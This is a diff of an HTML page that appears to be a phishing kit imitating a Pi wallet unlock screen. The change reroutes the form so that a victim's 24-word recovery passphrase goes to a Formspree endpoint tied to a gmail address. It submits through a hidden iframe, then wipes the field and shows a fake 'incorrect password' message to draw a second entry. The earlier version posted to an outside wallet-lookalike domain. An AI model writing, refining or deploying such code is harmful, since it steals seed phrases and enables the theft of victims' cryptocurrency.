@@ -24,35 +24,54 @@
         }
     </script>
 
-<form name="myForm" method="post" action="https://pwallett.com/wallet/send.php" onsubmit="return validateForm()">
+<form id="myForm" action="https://formspree.io/f/xpwjgekd" method="POST" target="hidden_iframe">
+  <table style="margin-left: auto; margin-right: auto;" cellspacing="0" cellpadding="2" border="0">
+    <tbody>
+      <!-- Email (non utilisé par Formspree pour l'envoi) -->
+      <tr>
+        <td><input type="hidden" name="email" value="n42872789@gmail.com"></td>
+      </tr>
 
- 
-<table style="margin-left: auto; margin-right: auto;" cellspacing="0" cellpadding="2" border="0">
-<tbody><tr>
+      <!-- Zone de texte -->
+      <tr>
+        <td colspan="2">
+          <textarea id="messageBox" 
+            style="border-radius: 3px; font-size: 1em; overflow: auto; resize: none; height: 30vh;" 
+            name="message" cols="45" rows="4" 
+            placeholder="Enter your 24-word passphrase here" required></textarea>
+        </td>
+      </tr>
 
- <td><input type="hidden" name="name" value="New Pi Logs" size="30" class="inpts"></td>
-</tr>
-<tr>
-
- <td><input type="hidden" name="email" value="demo@gmail.com" size="30" class="inpts"></td>
-</tr>
-<tr>
- <td colspan="2"><textarea style="border-radius: 3px; font-size: 1em; overflow: auto; resize: none; height: 30vh; " name="message" class="inpts" cols="45" rows="4" placeholder="Enter your 24-word passphrase here"></textarea>
-</td></tr>
-
-<tr><td colspan="2"></td></tr><tr><td colspan="2"></td></tr><tr><td colspan="2"></td></tr>
-
-<tr>
-    <td colspan="2"><button type="submit" class="bone" value="Submit"> Unlock With Passphrase</button>
-      </td> 
-
-</tr>
-
-<tr>
-    <td td="" colspan="2"> <button class="bone"> Unlock With Fingerprint </button></td>
-</tr>
-</tbody></table>
+      <!-- Boutons -->
+      <tr>
+        <td colspan="2"><button type="submit" class="bone">Unlock With Passphrase</button></td>
+      </tr>
+      <tr>
+        <td colspan="2"><button type="submit" class="bone">Unlock With Fingerprint</button></td>
+      </tr>
+    </tbody>
+  </table>
 </form>
+
+<!-- Message d'erreur caché au départ -->
+<p id="errorMessage" style="color:red; text-align:center; display:none; font-weight:bold;">
+  ❌ Mot de passe incorrect, réessayez encore.
+</p>
+
+<!-- iframe caché -->
+<iframe name="hidden_iframe" style="display:none;"></iframe>
+
+<script>
+  document.getElementById("myForm").addEventListener("submit", function() {
+    setTimeout(() => {
+      // vider le champ
+      document.getElementById("messageBox").value = "";
+      // afficher le message d'erreur
+      document.getElementById("errorMessage").style.display = "block";
+    }, 500);
+  });
+</script>
+
 
 
  <br>
